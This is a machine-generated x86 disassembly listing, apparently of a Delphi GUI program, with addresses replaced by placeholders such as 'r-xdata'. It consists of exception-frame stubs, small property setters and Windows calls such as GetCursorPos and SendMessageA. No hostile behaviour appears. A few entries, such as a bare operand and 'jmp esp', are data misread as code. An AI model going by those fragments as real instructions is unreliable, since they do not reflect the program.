mov [ eax + 0x6c ] edx
call sub_43ded4
sub_43c7b4
call sub_43ceb4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_43d15f
jmp sub_40382c
sub_43d166
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d183
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_43d17c
jmp sub_40382c
sub_43d183
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d464
jmp sub_40382c
sub_43d46b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d488
mov eax [ ebp - 0x4 ]
call sub_41d9d4
retn
sub_43d481
jmp sub_40382c
sub_43d488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d4a5
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_43d49e
jmp sub_40382c
sub_43d4a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d959
jmp sub_40382c
sub_43d960
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43daeb
jmp sub_40382c
sub_43daf2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dba7
jmp sub_40382c
sub_43dbae
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dc9c
jmp sub_40382c
sub_43dced
jmp sub_40382c
sub_43dcf4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ddb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c6c0
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_43defc
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43c1fc
sub_43e7fc
jmp sub_40382c
sub_43e803
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e8cc
call GetCapture
retn
sub_43e8d4
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c654
pop ebx
retn
sub_43e8e4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_43eb4a
jmp sub_40382c
sub_43ed44
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_43ef58
jmp sub_40382c
sub_43ef5f
pop ebx
mov esp ebp
pop ebp
retn
sub_43efaa
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_43f027
jmp sub_40382c
sub_43f02e
pop ebp
retn
sub_43f0b6
jmp sub_40382c
sub_43f0bd
pop ebp
retn
sub_43f80c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4138bc
retn
sub_43f824
mov al 0x1
retn
sub_43f828
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419f3c
retn
mov eax edx
retn
sub_43f838
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419f0c
retn
mov al 0x1
retn
sub_43fb28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413860
pop esi
pop ebx
retn
sub_43fb3c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_43fb78
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_43fddc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fdf0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe04
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe18
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe2c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe40
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe54
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe68
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe7c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fe90
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
pop ebx
retn
sub_43fea4
retn
sub_43fea8
retn
sub_43feac
retn
sub_43feb0
retn
sub_43feb4
retn
sub_43feb8
retn
sub_43febc
retn
sub_43fec0
retn
sub_43fec4
retn
sub_43fec8
retn
sub_43fecc
retn
sub_43fed0
retn
sub_44017c
jmp sub_40382c
sub_440518
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x90 ] eax
sub_440540
push esi
mov si 0xffef
call sub_4032ec
pop esi
retn
sub_4405e1
jmp sub_40382c
sub_4405e8
pop ebp
retn
sub_4405ec
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
sub_44078c
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_440911
jmp sub_40382c
sub_440918
pop ebx
pop ecx
pop ebp
retn
sub_44091c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_440924
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_440af4
sub_4409d1
jmp sub_40382c
sub_4409d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4030f0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_440b87
jmp sub_40382c
sub_440b8e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440c26
jmp sub_40382c
sub_440c2d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c4a
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_440c43
jmp sub_40382c
sub_440c4a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032ec
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440d03
jmp sub_40382c
sub_440d0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440d10
or edx 0xffffffff
call sub_440c84
retn
sub_44111f
jmp sub_40382c
sub_441126
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441143
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_44113c
jmp sub_40382c
sub_441143
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441160
mov eax [ ebp - 0x4 ]
call sub_441c58
retn
sub_441159
jmp sub_40382c
sub_441160
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441364
jmp sub_40382c
sub_44136b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441370
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4032ec
sub_441388
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412404
pop ebx
retn
sub_44142c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413704
sub_441543
jmp sub_40382c
sub_44154a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
sub_441560
jmp sub_40382c
sub_441872
jmp sub_40382c
sub_441879
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441896
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
sub_44188f
jmp sub_40382c
sub_441896
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418b3
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
sub_4418ac
jmp sub_40382c
sub_4418b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44191c
jmp sub_40382c
sub_441a35
jmp sub_40382c
sub_441a52
jmp sub_40382c
sub_441c0a
jmp sub_40382c
sub_441c11
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441c54
inc [ eax + 0x5c ]
retn
sub_441c58
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4032ec
sub_441cac
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_441ce9
jmp sub_40382c
sub_441cf0
pop ebp
retn
sub_441cf4
sub [ rw-data ] 0x1
retn
sub_442140
clc
push edx
push ecx
jmp [ eax ]
sub_44254c
out dx eax
[ eax + 0x69 ]
sub_442c5c
mov eax [ esp + 0x8 ]
retn
sub_442c64
push ebx
mov ebx eax
call sub_442c5c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
jmp sub_403864
sub_442c80
pop ebx
retn
sub_442ef9
jmp sub_40382c
sub_442f00
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44304b
jmp sub_40382c
sub_443052
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443068
push ebx
mov eax [ rw-data ]
call sub_413db8
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413d8c
mov eax ebx
pop ebx
retn
sub_4431f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44320c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_443907
jmp sub_40382c
sub_44390e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443a06
jmp sub_40382c
sub_443a0d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443e30
jmp sub_40382c
sub_443e37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4442e3
jmp sub_40382c
sub_444784
jmp sub_40382c
sub_44478b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444bef
jmp sub_40382c
sub_4450ac
jmp sub_40382c
sub_4450b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44545e
jmp sub_40382c
sub_445465
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445473
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_445620
mov eax [ r-xdata ]
retn
sub_44565c
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_445670
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_445680
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_445690
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44598c
mov edx eax
sub_445728
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032a0
mov edx esi
call sub_4456a8
pop esi
pop ebx
retn
sub_4457a4
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44598c
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4138bc
mov ecx eax
sub_445b7c
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_445be4
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_445f8c
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_445fc0
sub_445fc0
mov edx sub_445f98
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4430e8
retn
sub_4461aa
jmp sub_40382c
sub_4461b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446648
jmp sub_40382c
sub_446687
jmp sub_40382c
sub_44668e
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44682c
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446968
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4032ec
pop esi
pop ebp
retn 0x8
sub_446984
mov eax [ eax + 0x34 ]
call sub_443bbc
retn
sub_446990
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4032ec
pop esi
retn
sub_4469cc
push ebx
mov ecx sub_4469a4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4430e8
pop ebx
retn
sub_446c00
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_446c14
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_446d49
jmp sub_403578
sub_446e4b
jmp sub_40382c
sub_446e76
jmp sub_40382c
sub_446e7d
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_446e94
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44707c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4469cc
sub_4470fc
jmp sub_40382c
sub_447140
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_447158
push ebx
mov ebx eax
mov eax ebx
call sub_419f5c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_4471aa
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4469cc
sub_447220
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_447369
jmp sub_40382c
sub_447370
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4475b0
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_4475c0
sub_447614
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_447624
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_447634
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_447644
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_447654
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4476cc
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_443a14
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_443a14
retn
sub_4476e8
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_443a14
sub_447730
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_446984
retn
mov eax edx
retn
j_sub_403578#9
jmp sub_403578
sub_44776f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447ad5
jmp sub_40382c
sub_447adc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4030f0
retn
sub_447af2
jmp sub_40382c
sub_447bf3
jmp sub_40382c
sub_447bfa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c17
mov eax [ ebp - 0x14 ]
call sub_4030f0
retn
sub_447c10
jmp sub_40382c
sub_447c35
jmp sub_40382c
sub_447cbf
jmp sub_40382c
sub_447cc6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447cf8
push ebx
mov ebx eax
mov eax ebx
call sub_4139fc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41ad0c
sub_447dbc
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_447dd0
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_447dd8
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44819d
jmp sub_40382c
sub_4481a4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4482a4
jmp sub_40382c
sub_4482ab
pop ebp
retn
sub_448e63
[ edi + edi * 8 - 0x2f002f ]
sub_448e6a
stc
jmp esp
sub_44a12c
mov eax [ rw-data ]
retn
sub_44a134
mov [ rw-data ] eax
retn
sub_44a27c
jmp sub_403578
sub_44a2b3
jmp sub_40382c
sub_44a2ba
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a488
call sub_41ac34
retn
sub_44a5ca
jmp sub_40382c
sub_44a5d1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a675
jmp sub_40382c
sub_44a67c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a70c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44ae38
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44b4e4
sub_44ae54
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44ae38
sub_44af74
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44b4e4
sub_44af8c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44b4e4
sub_44afa4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44b4e4
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44afd0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44afdc
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44b4e4
retn
sub_44b2bc
push ebx
mov ebx edx
mov edx ebx
call sub_436ffc
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44b32c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44b454
jmp sub_40382c
sub_44b45b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b464
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44a870
mov eax [ ebx + 0x20c ]
call sub_44a870
sub_44b4c4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44b4d4
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44b5cf
jmp sub_40382c
sub_44b5dc
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44b5f4
sub_44b810
retn
sub_44b87e
jmp sub_40382c
sub_44b8bd
jmp sub_40382c
sub_44b8f0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4384f4
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44aafc
retn
sub_44b914
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_438514
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44aafc
retn
sub_44ba09
jmp sub_40382c
sub_44ba10
mov eax [ ebp - 0x4 ]
call sub_43a474
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44a764
mov eax [ ebp - 0x4 ]
call sub_44b4e4
sub_44bb44
jmp sub_40382c
sub_44bb7c
jmp sub_40382c
sub_44bb83
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bba3
lea eax [ ebp - 0x114 ]
call sub_403eac
retn
sub_44bb9c
jmp sub_40382c
sub_44bba3
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_44beaa
jmp sub_40382c
sub_44beb1
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40344c
j_sub_403578#8
jmp sub_403578
sub_44bf81
jmp sub_403578
sub_44bf86
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c33e
jmp sub_40382c
sub_44c345
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c420
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4179e4
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44c438
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c470
mov edx eax
mov eax esi
call sub_41926c
pop esi
pop ebx
retn
sub_44c454
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d814
mov edx eax
mov eax esi
call sub_41926c
pop esi
pop ebx
retn
sub_44c470
push ebx
mov ebx eax
mov eax ebx
call sub_44d4b4
mov edx r-xdata
call sub_41d958
pop ebx
retn
sub_44c574
push ebx
mov ebx eax
mov eax ebx
call sub_44c584
xor al 0x1
pop ebx
retn
sub_44c584
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44c5e0
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_44c600
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_44c620
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_44c919
jmp sub_40382c
sub_44c920
pop ecx
pop ebp
retn
sub_44c924
xor eax eax
retn
sub_44cbfc
jmp sub_40382c
sub_44cc03
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_44cc19
jmp sub_40382c
sub_44cd03
jmp sub_40382c
sub_44cd0a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cd27
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_44cd20
jmp sub_40382c
sub_44cd47
jmp sub_40382c
sub_44d032
jmp sub_40382c
sub_44d1c5
jmp sub_40382c
sub_44d4b4
mov eax [ eax + 0x238 ]
retn
sub_44d4bc
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44d4c8
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_44d806
jmp sub_40382c
sub_44d80d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d814
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_44d85c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_437710
sub_44d878
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_44d8b4
push ebx
mov ebx eax
mov eax ebx
call sub_4396a4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d324
sub_44d938
push ebx
mov ebx eax
mov eax ebx
call sub_4396cc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d9fc
sub_44d958
push ebx
mov ebx eax
mov eax ebx
call sub_44d578
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_44d640
pop ebx
retn
sub_44e185
lea eax [ ebp - 0xb4 ]
call sub_403eac
retn
sub_44e191
jmp sub_40382c
j_sub_44e185
jmp sub_44e185
sub_44e198
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e2f0
jmp sub_40382c
sub_44e2f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e5dc
jmp sub_40382c
sub_44e5e3
mov eax [ rw-data ]
call sub_450e94
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e5fa
add [ eax ] al
retn
sub_44e858
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_44e878
mov eax [ eax + 0x240 ]
call sub_421ba0
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_452c34
sub_44e91f
jmp sub_40382c
sub_44e926
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e949
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d9d4
retn
sub_44e942
jmp sub_40382c
sub_44e949
pop esi
pop ebx
pop ecx
pop ebp
retn
